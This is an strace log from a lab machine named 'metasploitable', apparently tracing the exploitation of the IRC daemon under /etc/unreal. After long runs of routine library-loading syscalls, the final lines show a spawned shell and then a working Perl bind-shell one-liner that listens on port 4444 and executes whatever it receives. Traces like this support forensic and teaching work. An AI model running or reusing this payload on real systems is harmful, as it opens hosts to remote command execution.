12008 20:22:34.953743 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
12008 20:22:34.953833 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
12008 20:22:34.953851 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f9d000
12008 20:22:34.953863 mmap2(0xb7f9f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f9f000
12008 20:22:34.953880 close(1)          = 0
12008 20:22:34.953891 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12008 20:22:34.953905 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
12008 20:22:34.953919 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
12008 20:22:34.954048 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
12008 20:22:34.954080 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f9c000
12008 20:22:34.954095 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e4d000
12008 20:22:34.954106 mmap2(0xb7f96000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f96000
12008 20:22:34.954121 mmap2(0xb7f99000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f99000
12008 20:22:34.954135 close(1)          = 0
12008 20:22:34.954158 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e4c000
12008 20:22:34.954170 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e4c6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
12008 20:22:34.954229 mprotect(0xb7f96000, 4096, PROT_READ) = 0
12008 20:22:34.954266 munmap(0xb7fd1000, 29913) = 0
12008 20:22:34.954292 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12008 20:22:34.954306 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
12008 20:22:34.954326 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfaf0c80) = -1 ENOTTY (Inappropriate ioctl for device)
12008 20:22:34.954356 brk(0)            = 0x80f9000
12008 20:22:34.954366 brk(0x80fa000)    = 0x80fa000
12008 20:22:34.954378 brk(0x80fb000)    = 0x80fb000
12008 20:22:34.954394 getuid32()        = 0
12008 20:22:34.954403 getgid32()        = 0
12008 20:22:34.954413 geteuid32()       = 0
12008 20:22:34.954422 getegid32()       = 0
12008 20:22:34.954435 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12008 20:22:34.954449 time(NULL)        = 1495671754
12008 20:22:34.954462 brk(0x80fc000)    = 0x80fc000
12008 20:22:34.954488 brk(0x80fd000)    = 0x80fd000
12008 20:22:34.954512 open("/proc/meminfo", O_RDONLY) = 1
12008 20:22:34.954555 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
12008 20:22:34.954587 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd8000
12008 20:22:34.954599 read(1, "MemTotal:      1035240 kB\nMemFree:        159176 kB\nBuffers:        141516 kB\nCached:         489468 kB\nSwapCached:          0 kB\nActive:         515448 kB\nInactive:       306128 kB\nHighTotal:      131008 kB\nHighFree:          248 kB\nLowTotal:       904232 kB\nLowFree:        158928 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:             104 kB\nWriteback:           0 kB\nAnonPages:      190624 kB\nMapped:          52608 kB\nSlab:            32656 kB\nSReclaimable:    20192 kB\nSUnreclaim:      12464 kB\nPageTables:       2924 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   710184 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
12008 20:22:34.954723 close(1)          = 0
12008 20:22:34.954735 munmap(0xb7fd8000, 4096) = 0
12008 20:22:34.954748 brk(0x80fe000)    = 0x80fe000
12008 20:22:34.954774 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
12008 20:22:34.954788 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
12008 20:22:34.954804 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12008 20:22:34.954816 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12008 20:22:34.954828 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
12008 20:22:34.954841 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
12008 20:22:34.954855 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12008 20:22:34.954867 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12008 20:22:34.954880 uname({sys="Linux", node="metasploitable", ...}) = 0
12008 20:22:34.954929 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12008 20:22:34.954947 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12008 20:22:34.954966 brk(0x8100000)    = 0x8100000
12008 20:22:34.954969 getcwd("/etc/unreal", 4096) = 12
12008 20:22:34.954970 getpid()          = 12008
12008 20:22:34.954970 getppid()         = 4519
12008 20:22:34.954970 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12008 20:22:34.954979 stat64("/sbin/sh", 0xbfaf0c58) = -1 ENOENT (No such file or directory)
12008 20:22:34.954992 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
12008 20:22:34.955010 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
12008 20:22:34.955035 socket(PF_FILE, SOCK_STREAM, 0) = 1
12008 20:22:34.955048 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
12008 20:22:34.955060 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
12008 20:22:34.955083 close(1)          = 0
12008 20:22:34.955095 socket(PF_FILE, SOCK_STREAM, 0) = 1
12008 20:22:34.955105 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
12008 20:22:34.955115 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
12008 20:22:34.955134 close(1)          = 0
12008 20:22:34.955147 open("/etc/nsswitch.conf", O_RDONLY) = 1
12008 20:22:34.955162 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
12008 20:22:34.955179 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd8000
12008 20:22:34.955190 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
12008 20:22:34.955240 read(1, "", 4096) = 0
12008 20:22:34.955250 close(1)          = 0
12008 20:22:34.955259 munmap(0xb7fd8000, 4096) = 0
12008 20:22:34.955276 open("/etc/ld.so.cache", O_RDONLY) = 1
12008 20:22:34.955301 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12008 20:22:34.955319 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fd1000
12008 20:22:34.955330 close(1)          = 0
12008 20:22:34.955340 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12008 20:22:34.955356 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
12008 20:22:34.955371 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
12008 20:22:34.955465 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
12008 20:22:34.955484 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e43000
12008 20:22:34.955496 mmap2(0xb7e4a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7e4a000
12008 20:22:34.955513 close(1)          = 0
12008 20:22:34.955525 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12008 20:22:34.955539 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
12008 20:22:34.955553 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
12008 20:22:34.955641 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
12008 20:22:34.955659 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e2b000
12008 20:22:34.955670 mmap2(0xb7e3f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7e3f000
12008 20:22:34.955686 mmap2(0xb7e41000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e41000
12008 20:22:34.955700 close(1)          = 0
12008 20:22:34.955727 munmap(0xb7fd1000, 29913) = 0
12008 20:22:34.955745 open("/etc/ld.so.cache", O_RDONLY) = 1
12008 20:22:34.955758 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12008 20:22:34.955775 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fd1000
12008 20:22:34.955794 close(1)          = 0
12008 20:22:34.955805 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12008 20:22:34.955821 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
12008 20:22:34.955835 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12008 20:22:34.955926 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
12008 20:22:34.955947 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e21000
12008 20:22:34.955959 mmap2(0xb7e29000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7e29000
12008 20:22:34.955975 close(1)          = 0
12008 20:22:34.955988 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12008 20:22:34.956002 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
12008 20:22:34.956017 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12008 20:22:34.956107 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
12008 20:22:34.956124 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e16000
12008 20:22:34.956136 mmap2(0xb7e1f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7e1f000
12008 20:22:34.956152 close(1)          = 0
12008 20:22:34.956173 munmap(0xb7fd1000, 29913) = 0
12008 20:22:34.956189 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
12008 20:22:34.956204 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
12008 20:22:34.956216 _llseek(1, 0, [0], SEEK_CUR) = 0
12008 20:22:34.956228 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
12008 20:22:34.956245 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7fd8000
12008 20:22:34.956255 _llseek(1, 1624, [1624], SEEK_SET) = 0
12008 20:22:34.956271 munmap(0xb7fd8000, 1624) = 0
12008 20:22:34.956289 close(1)          = 0
12008 20:22:34.956320 getpgrp()         = 3831
12008 20:22:34.956331 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
12008 20:22:34.956347 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
12008 20:22:34.956363 brk(0x8101000)    = 0x8101000
12008 20:22:34.956395 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12008 20:22:34.956410 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12008 20:22:34.956426 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12008 20:22:34.956464 brk(0x8102000)    = 0x8102000
12008 20:22:34.956490 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12008 20:22:34.956509 stat64("/sbin/AB", 0xbfaf0918) = -1 ENOENT (No such file or directory)
12008 20:22:34.956522 stat64("/bin/AB", 0xbfaf0918) = -1 ENOENT (No such file or directory)
12008 20:22:34.956533 stat64("/usr/sbin/AB", 0xbfaf0918) = -1 ENOENT (No such file or directory)
12008 20:22:34.956545 stat64("/usr/bin/AB", 0xbfaf0918) = -1 ENOENT (No such file or directory)
12008 20:22:34.956559 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
12008 20:22:34.956574 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e4c6f8) = 12009
12009 20:22:34.956621 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12009 20:22:34.956638 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
12009 20:22:34.956651 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
12009 20:22:34.956663 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
12009 20:22:34.956679 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12009 20:22:34.956698 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12009 20:22:34.956711 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
12009 20:22:34.956767 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
12009 20:22:34.956795 --- SIGPIPE (Broken pipe) @ 0 (0) ---
12009 20:22:34.956860 exit_group(127)   = ?
12008 20:22:34.995627 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
4519  20:22:34.995684 waitpid(12008,  <unfinished ...>
12008 20:22:34.995739 <... rt_sigprocmask resumed> NULL, 8) = 0
12008 20:22:35.154958 --- SIGCHLD (Child exited) @ 0 (0) ---
12008 20:22:35.154958 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 12009
12008 20:22:35.155002 waitpid(-1, 0xbfaf0598, WNOHANG) = -1 ECHILD (No child processes)
12008 20:22:35.155013 sigreturn()       = ? (mask now [])
12008 20:22:35.155039 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
12008 20:22:35.155056 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12008 20:22:35.155068 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
12008 20:22:35.155080 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
12008 20:22:35.155100 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12008 20:22:35.155112 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
12008 20:22:35.155148 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12008 20:22:35.155170 stat64("/sbin/perl", 0xbfaf0948) = -1 ENOENT (No such file or directory)
12008 20:22:35.155183 stat64("/bin/perl", 0xbfaf0948) = -1 ENOENT (No such file or directory)
12008 20:22:35.155195 stat64("/usr/sbin/perl", 0xbfaf0948) = -1 ENOENT (No such file or directory)
12008 20:22:35.155207 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
12008 20:22:35.155225 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
12008 20:22:35.155251 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
12008 20:22:35.155268 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e4c6f8) = 12010
12010 20:22:35.184978 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12010 20:22:35.185008 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
12010 20:22:35.185022 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
12010 20:22:35.185035 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
12010 20:22:35.185051 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12010 20:22:35.185067 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12010 20:22:35.185080 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
12010 20:22:35.185119 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
12010 20:22:35.185217 brk(0)            = 0x8153000
